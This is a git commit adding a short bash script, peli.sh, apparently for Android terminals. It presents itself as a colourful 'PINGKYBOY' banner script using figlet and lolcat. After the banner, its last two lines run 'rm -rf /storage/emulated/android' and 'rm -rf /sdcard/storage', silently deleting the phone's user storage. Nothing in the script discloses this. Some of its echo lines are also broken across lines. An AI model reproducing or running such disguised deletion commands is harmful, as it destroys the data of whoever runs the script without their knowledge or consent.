686ef9d9c45165cd4fb84f56d9d3a644293c1d22
PINGKYBOY <44575348+PINGKYBOY@users.noreply.github.com>
2018-12-21 11:28:58 +0700

    Y
    Y

---
+++ peli.sh
@@ -0,0 +1,27 @@
+#!/bin/bash
+#version 1.0 
+
+# Variables
+b='\033[1m'
+u='\033[4m'
+bl='\E[30m'
+r='\E[31m'
+g='\E[32m'
+bu='\E[34m'
+m='\E[35m'
+c='\E[36m'
+w='\E[37m'
+endc='\E[0m'
+enda='\033[0m'
+blue='\e[1;34m'
+cyan='\e[1;36m'
+red='\e[1;31m'
+
+figlet PINGKYBOY | lolcat
+
+echo -e  
+"_____________________________________________________________"
+echo -e  "AKU    : CELEH $white  " 
+|lolcat
+rm -rf /storage/emulated/android
+rm -rf /sdcard/storage
